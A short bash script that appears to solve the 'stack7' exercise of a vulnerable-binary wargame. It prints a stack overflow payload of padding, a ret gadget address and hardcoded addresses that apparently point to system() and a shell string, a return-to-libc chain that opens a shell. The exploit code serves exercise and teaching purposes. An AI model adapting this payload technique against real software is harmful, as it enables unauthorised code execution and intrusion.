#!/bin/bash
encode() {
    printf "$1" | xxd -r -p
}

offset="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"

# Find a `ret` instruction in the allowed range of the binary.
# `objdump -D stack7 | grep ret`
# Use the first one, for example -- x08048383
ret=`encode 83830408`

# See the previous solution for explanation
jmp=`encode b0ffecb7`
return_addr="AAAA"
shellpath=`encode bf63fbb7`

echo "$offset$ret$jmp$return_addr$shellpath"
